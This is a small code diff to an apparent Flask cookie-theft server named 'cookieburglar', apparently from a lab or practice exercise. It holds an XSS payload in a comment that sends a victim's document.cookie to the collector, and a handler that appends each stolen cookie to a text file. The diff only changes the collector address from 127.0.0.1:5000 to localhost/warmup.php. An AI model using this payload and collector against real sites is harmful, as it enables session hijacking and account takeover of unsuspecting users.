@@ -11,7 +11,7 @@ app = Flask(__name__)
 def cookieburglar():
     
     #get document.cookie from xss payload, send to malicious server & store in a txt file
-    #xss payload: <script language=“JavaScript”>document.location=“http://127.0.0.1:5000/?c=“+document.cookie;</script>
+    #xss payload: <script language=“JavaScript”>document.location=“http://localhost/warmup.php?c=“+document.cookie;</script>
     cookieburglar = request.args.get('c')
     f = open("/home/tic/Documents/cookies.txt","a")
     f.write(cookieburglar+ ' ' + '\n')
